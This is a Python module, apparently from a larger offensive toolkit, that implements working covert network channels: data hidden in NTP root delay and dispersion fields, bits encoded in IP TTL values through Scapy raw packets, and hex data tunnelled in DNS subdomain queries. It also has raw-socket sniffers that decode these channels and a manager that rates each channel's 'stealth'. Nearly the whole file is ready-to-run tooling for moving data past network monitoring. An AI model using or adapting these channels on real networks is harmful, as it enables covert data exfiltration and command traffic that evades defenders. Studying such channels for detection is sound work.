"""
Steganographic Channels - Hide data in network protocols
"""

import asyncio
import logging
import socket
import struct
import time
from abc import ABC, abstractmethod
from typing import Optional

# Import scapy for raw packet manipulation
try:
    from scapy.all import IP, UDP, Raw, send

    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


logger = logging.getLogger(__name__)

if not SCAPY_AVAILABLE:
    logger.debug("Scapy not available; TTL channel will fall back to limited functionality.")


class SteganographicChannel(ABC):
    """Base class for steganographic channels."""

    @abstractmethod
    async def send_data(self, data: bytes, target: str) -> bool:
        """Send data through steganographic channel."""
        pass

    @abstractmethod
    async def receive_data(self) -> Optional[bytes]:
        """Receive data from steganographic channel."""
        pass


class NTPChannel(SteganographicChannel):
    """Hide data in NTP packets with proper UDP listener."""

    def __init__(self):
        self.sock = None
        self.buffer = bytearray()
        self.receive_socket = None
        self.receive_task = None
        self.packet_queue = asyncio.Queue()

    async def send_data(self, data: bytes, target: str) -> bool:
        """Send data hidden in NTP packet."""
        try:
            # Create NTP packet with hidden data
            ntp_packet = self._create_ntp_packet(data[:8])  # Max 8 bytes per packet

            # Send to NTP server (port 123)
            host, port = target.split(":") if ":" in target else (target, 123)

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(ntp_packet, (host, int(port)))
            sock.close()

            return True
        except Exception:
            return False

    async def receive_data(self, timeout: float = 5.0) -> Optional[bytes]:
        """Extract data from NTP packet using UDP listener."""
        try:
            # Start listener if not already running
            if self.receive_socket is None:
                await self._start_listener()

            # Wait for packet from queue
            try:
                packet_data = await asyncio.wait_for(self.packet_queue.get(), timeout=timeout)
                return self._extract_from_ntp(packet_data)
            except asyncio.TimeoutError:
                return None
        except Exception as e:
            logger.error(f"Error receiving NTP data: {e}")
            return None

    async def _start_listener(self):
        """Start UDP listener for NTP packets."""
        try:
            self.receive_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.receive_socket.bind(("0.0.0.0", 123))
            self.receive_socket.setblocking(False)

            # Start background task to receive packets
            self.receive_task = asyncio.create_task(self._receive_loop())
            logger.debug("NTP channel listener started")
        except OSError as e:
            logger.warning(f"Could not bind to NTP port 123: {e}")
            self.receive_socket = None

    async def _receive_loop(self):
        """Background loop to receive UDP packets."""
        while self.receive_socket:
            try:
                loop = asyncio.get_event_loop()
                data, addr = await loop.sock_recvfrom(self.receive_socket, 48)
                if len(data) == 48:  # Valid NTP packet size
                    await self.packet_queue.put(data)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.debug(f"Error in NTP receive loop: {e}")
                await asyncio.sleep(0.1)

    def _stop_listener(self):
        """Stop UDP listener."""
        if self.receive_task:
            self.receive_task.cancel()
        if self.receive_socket:
            self.receive_socket.close()
            self.receive_socket = None

    def _create_ntp_packet(self, hidden_data: bytes) -> bytes:
        """Create NTP packet with hidden data."""
        # Basic NTP packet structure
        packet = bytearray(48)

        # Set version (3), mode (3 - client)
        packet[0] = 0x1B

        # Hide data in precision and delay fields (unused in client requests)
        for i, byte in enumerate(hidden_data):
            if i < 4:
                packet[4 + i] = byte  # Root delay field
            elif i < 8:
                packet[8 + i - 4] = byte  # Root dispersion field

        # Set timestamp (current time)
        timestamp = int(time.time()) + 2208988800  # NTP epoch offset
        struct.pack_into(">I", packet, 40, timestamp)

        return bytes(packet)

    def _extract_from_ntp(self, packet: bytes) -> bytes:
        """Extract hidden data from NTP packet."""
        if len(packet) < 48:
            return b""

        # Extract from root delay and dispersion fields
        hidden_data = packet[4:8] + packet[8:12]
        return hidden_data.rstrip(b"\x00")


class TTLChannel(SteganographicChannel):
    """
    Hide data in IP TTL field using raw packet manipulation.

    Implemented functional TTL steganography with proper packet crafting
    using Scapy for raw socket operations as per Phase 2 requirements.
    """

    def __init__(self):
        self.received_bits = []
        self.normal_ttls = [64, 128, 255]  # Common TTL values
        self.encoding_base = 64  # Base TTL value for encoding

    async def send_data(self, data: bytes, target: str) -> bool:
        """
        Send data by modulating TTL values in IP packets.

        Uses raw packet crafting to embed data in TTL field.
        Each byte is split into bits and encoded as TTL variations.
        """
        if not SCAPY_AVAILABLE:
            # Fallback implementation without scapy
            return await self._send_data_fallback(data, target)

        try:
            # Convert data to bits
            bits = []
            for byte in data:
                bits.extend([(byte >> i) & 1 for i in range(8)])

            # Send packets with encoded TTL values
            for bit in bits:
                # Encode bit in TTL: base TTL + bit value
                ttl = self.encoding_base + bit

                # Create packet with custom TTL
                packet = IP(dst=target, ttl=ttl) / UDP(dport=53) / Raw(b"dns_query_dummy")

                # Send packet (may require root privileges)
                try:
                    send(packet, verbose=0)
                    await asyncio.sleep(0.1)  # Small delay between packets
                except Exception as e:
                    logger.debug("Could not send raw packet: %s", e)
                    return False

            return True

        except Exception as e:
            logger.error("Error in TTL channel send: %s", e)
            return False

    async def _send_data_fallback(self, data: bytes, target: str) -> bool:
        """
        Fallback implementation when scapy is not available.
        Uses socket options to set TTL (limited functionality).
        """
        try:
            for byte in data:
                # Extract bits from byte
                for i in range(8):
                    bit = (byte >> i) & 1
                    ttl = self.encoding_base + bit

                    # Create UDP socket with custom TTL
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    try:
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
                        sock.sendto(b"steganographic_data", (target, 53))
                        await asyncio.sleep(0.1)
                    finally:
                        sock.close()

            return True

        except Exception as e:
            logger.error("Error in TTL fallback send: %s", e)
            return False

    async def receive_data(self, timeout: float = 5.0) -> Optional[bytes]:
        """
        Extract data from received packets by analyzing TTL values.

        Implements continuous packet capture using scapy or raw sockets to read TTL values
        from incoming IP packets and decode the hidden data.
        """
        if not SCAPY_AVAILABLE:
            # Fallback implementation using raw sockets
            return await self._receive_data_fallback(timeout)

        try:
            # Use scapy to sniff packets and extract TTL values
            from scapy.all import IP, sniff

            # Sniff packets with timeout
            packets = sniff(count=8, timeout=timeout, filter="ip", store=True, quiet=True)

            if not packets:
                return None

            for packet in packets:
                if IP in packet:
                    ttl = packet[IP].ttl
                    bit = self._extract_bit_from_ttl(ttl)

                    if bit is not None:
                        self.received_bits.append(bit)

                        # When we have 8 bits, convert to byte
                        if len(self.received_bits) >= 8:
                            byte_value = 0
                            for i in range(8):
                                if i < len(self.received_bits):
                                    byte_value |= self.received_bits[i] << i

                            self.received_bits = self.received_bits[8:]
                            return bytes([byte_value])

            return None

        except Exception as e:
            logger.error(f"Error in TTL channel receive: {e}")
            return None

    async def _receive_data_fallback(self, timeout: float = 5.0) -> Optional[bytes]:
        """
        Fallback implementation using raw sockets when scapy is not available.
        Requires root/administrator privileges.
        """
        try:
            # Create raw socket to capture IP packets
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.setblocking(False)
            except PermissionError:
                logger.warning("Raw socket requires root privileges for TTL channel receive")
                return None

            # Try to receive multiple packets with timeout
            loop = asyncio.get_event_loop()
            end_time = asyncio.get_event_loop().time() + timeout

            try:
                while asyncio.get_event_loop().time() < end_time:
                    remaining_time = end_time - asyncio.get_event_loop().time()
                    if remaining_time <= 0:
                        break

                    try:
                        packet_data, addr = await asyncio.wait_for(
                            loop.sock_recvfrom(sock, 65535), timeout=min(remaining_time, 1.0)
                        )

                        # Parse IP header to extract TTL (byte 8 in IP header)
                        if len(packet_data) >= 20:  # Minimum IP header size
                            ttl = packet_data[8]
                            bit = self._extract_bit_from_ttl(ttl)

                            if bit is not None:
                                self.received_bits.append(bit)

                                # When we have 8 bits, convert to byte
                                if len(self.received_bits) >= 8:
                                    byte_value = 0
                                    for i in range(8):
                                        if i < len(self.received_bits):
                                            byte_value |= self.received_bits[i] << i

                                    self.received_bits = self.received_bits[8:]
                                    sock.close()
                                    return bytes([byte_value])
                    except asyncio.TimeoutError:
                        continue
            finally:
                sock.close()

            return None

        except Exception as e:
            logger.error(f"Error in TTL fallback receive: {e}")
            return None

    def _extract_bit_from_ttl(self, ttl: int) -> Optional[int]:
        """Extract hidden bit from TTL value."""
        if ttl >= self.encoding_base and ttl <= self.encoding_base + 1:
            return ttl - self.encoding_base
        return None


class DNSChannel(SteganographicChannel):
    """Hide data in DNS queries with proper packet capture."""

    def __init__(self):
        self.domain_base = "example.com"
        self.received_queries = []
        self.query_buffer = bytearray()
        self.sniffer_task = None
        self.packet_queue = asyncio.Queue()
        self.is_listening = False

    async def send_data(self, data: bytes, target: str) -> bool:
        """Send data in DNS subdomain."""
        try:
            # Split data into chunks that fit in DNS subdomain (max 63 chars per label)
            # Hex encoding doubles size, so max ~31 bytes per subdomain
            chunk_size = 31
            chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]

            for chunk in chunks:
                hex_data = chunk.hex()
                subdomain = f"{hex_data}.{self.domain_base}"

                # Perform DNS lookup (this sends the data)
                try:
                    socket.gethostbyname(subdomain)
                    await asyncio.sleep(0.1)  # Small delay between queries
                except socket.gaierror:
                    pass  # Expected for non-existent domains

            return True
        except Exception as e:
            logger.error(f"Error sending DNS steganographic data: {e}")
            return False

    async def receive_data(self, timeout: float = 5.0) -> Optional[bytes]:
        """Extract data from DNS queries using packet capture."""
        try:
            # Start sniffer if not already running
            if not self.is_listening:
                await self._start_sniffer()

            # Wait for packet from queue
            try:
                decoded_data = await asyncio.wait_for(self.packet_queue.get(), timeout=timeout)
                return decoded_data
            except asyncio.TimeoutError:
                return None
        except Exception as e:
            logger.error(f"Error receiving DNS data: {e}")
            return None

    async def _start_sniffer(self):
        """Start DNS packet sniffer in background."""
        if self.is_listening:
            return

        if SCAPY_AVAILABLE:
            self.is_listening = True
            self.sniffer_task = asyncio.create_task(self._sniff_loop())
            logger.debug("DNS channel sniffer started")
        else:
            # Fallback: Use raw socket to capture DNS packets
            try:
                self.is_listening = True
                self.sniffer_task = asyncio.create_task(self._raw_socket_sniff())
                logger.debug("DNS channel raw socket sniffer started")
            except Exception as e:
                logger.warning(f"Could not start DNS sniffer: {e}")
                self.is_listening = False

    async def _sniff_loop(self):
        """Background loop to sniff DNS packets using scapy."""
        while self.is_listening:
            try:
                from scapy.all import DNS, sniff

                # Sniff DNS packets with short timeout
                packets = sniff(count=1, timeout=1.0, filter="udp port 53", store=True, quiet=True)

                if packets:
                    packet = packets[0]
                    if DNS in packet and packet[DNS].qr == 0:  # DNS query (not response)
                        qname = packet[DNS].qname.decode("utf-8", errors="ignore").rstrip(".")

                        # Check if query matches our domain pattern
                        if self.domain_base in qname:
                            subdomain = qname.split(".")[0]
                            try:
                                # Try to decode hex data
                                decoded = bytes.fromhex(subdomain)
                                await self.packet_queue.put(decoded)
                            except ValueError:
                                pass  # Not valid hex, skip

                await asyncio.sleep(0.1)  # Small delay to prevent CPU spinning
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.debug(f"Error in DNS sniff loop: {e}")
                await asyncio.sleep(1.0)

    async def _raw_socket_sniff(self):
        """Fallback DNS packet capture using raw socket."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.setblocking(False)

            loop = asyncio.get_event_loop()
            while self.is_listening:
                try:
                    packet_data, addr = await asyncio.wait_for(
                        loop.sock_recvfrom(sock, 65535), timeout=1.0
                    )

                    # Parse UDP header (starts at byte 20 after IP header)
                    if len(packet_data) >= 28:
                        src_port = struct.unpack("!H", packet_data[20:22])[0]
                        dst_port = struct.unpack("!H", packet_data[22:24])[0]

                        # Check if this is DNS (port 53)
                        if src_port == 53 or dst_port == 53:
                            # Parse DNS query (simplified)
                            dns_data = packet_data[28:]
                            if len(dns_data) > 12:
                                # Extract query name (simplified parsing)
                                qname_end = dns_data.find(b"\x00", 12)
                                if qname_end > 12:
                                    qname_bytes = dns_data[12:qname_end]
                                    try:
                                        qname = qname_bytes.decode("utf-8", errors="ignore")
                                        if self.domain_base in qname:
                                            subdomain = qname.split(".")[0]
                                            try:
                                                decoded = bytes.fromhex(subdomain)
                                                await self.packet_queue.put(decoded)
                                            except ValueError:
                                                pass
                                    except Exception:
                                        pass
                except asyncio.TimeoutError:
                    continue
                except PermissionError:
                    logger.warning("Raw socket requires root privileges for DNS capture")
                    break
                except Exception as e:
                    logger.debug(f"Error in raw socket DNS sniff: {e}")
                    await asyncio.sleep(1.0)

            sock.close()
        except PermissionError:
            logger.warning("Raw socket requires root privileges")
        except Exception as e:
            logger.error(f"Error starting raw socket DNS sniffer: {e}")

    def _stop_sniffer(self):
        """Stop DNS packet sniffer."""
        self.is_listening = False
        if self.sniffer_task:
            self.sniffer_task.cancel()


class ChannelManager:
    """Manage multiple steganographic channels."""

    def __init__(self):
        self.channels = {"ntp": NTPChannel(), "ttl": TTLChannel(), "dns": DNSChannel()}
        self.active_channel = "ntp"

    async def send_data(self, data: bytes, target: str, channel: Optional[str] = None) -> bool:
        """Send data through specified or active channel."""
        channel_name = channel or self.active_channel

        if channel_name not in self.channels:
            return False

        return await self.channels[channel_name].send_data(data, target)

    async def receive_data(
        self, channel: Optional[str] = None, timeout: float = 5.0
    ) -> Optional[bytes]:
        """Receive data from specified or active channel."""
        channel_name = channel or self.active_channel

        if channel_name not in self.channels:
            return None

        return await self.channels[channel_name].receive_data(timeout)

    async def stop_all_listeners(self):
        """Stop all active listeners in channels."""
        for channel in self.channels.values():
            if hasattr(channel, "_stop_listener"):
                channel._stop_listener()
            if hasattr(channel, "_stop_sniffer"):
                channel._stop_sniffer()

    def switch_channel(self, channel: str):
        """Switch active channel."""
        if channel in self.channels:
            self.active_channel = channel

    def get_channel_info(self) -> dict[str, dict]:
        """Get information about available channels."""
        return {
            "ntp": {"capacity": "8 bytes/packet", "stealth": "high", "bandwidth": "low"},
            "ttl": {"capacity": "1 bit/packet", "stealth": "very high", "bandwidth": "very low"},
            "dns": {"capacity": "variable", "stealth": "medium", "bandwidth": "medium"},
        }
